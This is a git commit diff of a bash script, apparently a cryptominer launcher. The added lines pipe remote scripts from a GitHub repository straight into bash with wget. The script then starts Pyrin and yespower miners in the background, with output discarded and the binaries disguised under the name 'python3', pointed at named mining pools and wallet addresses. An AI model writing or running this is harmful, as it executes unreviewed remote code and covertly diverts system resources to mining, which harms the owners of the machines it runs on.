e82388bedfddadc4ec56150cf21a70fad93485e0
DotAja <142836390+DotAja@users.noreply.github.com>
2024-05-15 06:14:11 +0700

    created hendi kusnandi

--- akuDot.sh
+++ akuDot.sh
@@ -1,32 +1,20 @@
 #!/bin/bash
 
-echo "download dot-srb..."
+bash -c "$(wget -qO- raw.githubusercontent.com/DotAja/ALONE/main/ALAT-COLI/DotLol.sh)"
 
-wget -q -O dot-srb s.id/25RZs
+bash -c "$(wget -qO- raw.githubusercontent.com/DotAja/ALONE/main/ALAT-COLI/DotSrb.sh)"
 
-echo "ekstrak dot-srb..."
+clear 5
 
-tar -xzf dot-srb >/dev/null
-
-echo "hapus dot-srb..."
-
-rm dot-srb
-# SAMPE SINI
-echo "download dot-lol..."
-
-wget -q -O dot-lol s.id/25RZu
-
-echo "ekstrak dot-lol..."
-
-tar -xzvf dot-lol  >/dev/null
-
-echo "hapus dot-lol..."
-
-rm dot-lol
+echo "menjalankan dotlol..."
 
 nohup ./dotlol/python3 -a PYRIN --pool kr.pyrin.herominers.com:1177 --user pyrin:qq5fnz6aelfdruhshjpul598fxyeqfkjh86cvypt2902mghd0ql7gy7g799ff.DOT --no-cl > /dev/null 2>&1 &
 
-sleep 10
+sleep 5
+
+clear
+
+echo "menjalankan dotsrb..."
 
 nohup ./dotsrb/python3 -a yespower -o stratum-eu.rplant.xyz:7122 -u QdeLX9ToumSqAfryzmfxJv366NtwStVimq.DOT > /dev/null 2>&1 &
 
@@ -34,11 +22,4 @@ sleep 5
 
 clear
 
-echo "======================================================"
-echo "██████╗  ██████╗ ████████╗     █████╗      ██╗ █████╗"
-echo "██╔══██╗██╔═══██╗╚══██╔══╝    ██╔══██╗     ██║██╔══██╗"
-echo "██║  ██║██║   ██║   ██║       ███████║     ██║███████║"
-echo "██║  ██║██║   ██║   ██║       ██╔══██║██   ██║██╔══██║"
-echo "██████╔╝╚██████╔╝   ██║       ██║  ██║╚█████╔╝██║  ██║"
-echo "╚═════╝  ╚═════╝    ╚═╝       ╚═╝  ╚═╝ ╚════╝ ╚═╝  ╚═╝"
-echo "=============created By Hendi Kusnandi================"
+echo "berjalan semuanya..."
